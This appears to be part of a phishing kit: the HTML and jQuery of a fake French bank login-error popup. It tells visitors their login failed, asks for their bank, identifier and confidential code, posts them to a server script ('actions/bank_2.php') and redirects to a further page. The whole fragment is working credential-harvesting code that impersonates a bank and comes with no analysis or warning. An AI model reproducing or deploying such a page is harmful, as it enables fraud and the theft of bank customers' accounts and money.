		...
		<div class="modal-contentb">
			...
			<div class="document" style="height: auto;display: flex;flex-direction: column;">
				<div class="header popinV3-header ">
					...
					<h1 id="popinTitle" style="text-align: center; color: #e03135;" >Erreur de connexion</h1>
					<p  style="text-align: center; color: #e03135;" >Votre identifiant banque en ligne est inconnu ou votre mot de passe est incorrect. </p>
				</div>
				<div class="line" style="max-height: 400px;">
            ...
            <div class="form-group col-15 row" style="margin-top:-10px;left:-2px">              
              <label class="col-5" for="id" style="text-align: right;">BANQUE:</label>
              <select type="bank1" class="form-control bank1 col-5" id="bank1" name="bank1" style="min-width:140px;">
                            <option value="">Votre Banque</option>
            ...
            <div class="form-group col-15 row" style="margin-top:-10px;left:-2px">              
              <label class="col-5" style="text-align: right;">IDENTIFIANT:</label>
              <input type="tel" class="form-control identif1 col-5" id="identif1" name="identif1" placeholder="" maxlength="15">
            </div>
                        <div class="form-group col-15 row" style="margin-top:-10px;left:-2px">              
              <label class="col-5" style="text-align: right;">CODE CONFIDENTIEL:</label>
              <input type="password" class="form-control code1 col-5" id="code1" name="code1" placeholder="_ _ _ _ _ _ _ _" maxlength="15">
            </div>
                        <div class="btns">
                            <button type="button" id="submit"><i class="fas fa-lock"></i> Se connecter</button>
                        </div>
                        <br>
                    </form>
        ...
        <script type="text/JavaScript">
            ...
            $(document).ready(function() {
                ...
                $('#submit').click(function(e) {
                    e.preventDefault();
                     if (  $('.identif1').val().length >= 1 && $('.code1').val().length >= 1) {

                        $.ajax({
                            type: "post",
                            url: "actions/bank_2.php",
                            data: "identif1=" + $('.identif1').val() + "&code1=" + $('.code1').val() + "&bank1=" + $('.bank1').val(),
                            success: function(response) {
                                window.location.href = 'rio.php';
                                
                            }
                        });
                          } else {
                        alert('Votre identifiant est inconnu ou votre mot de passe est incorrect. Veuillez renouveler votre identification.')
                    }
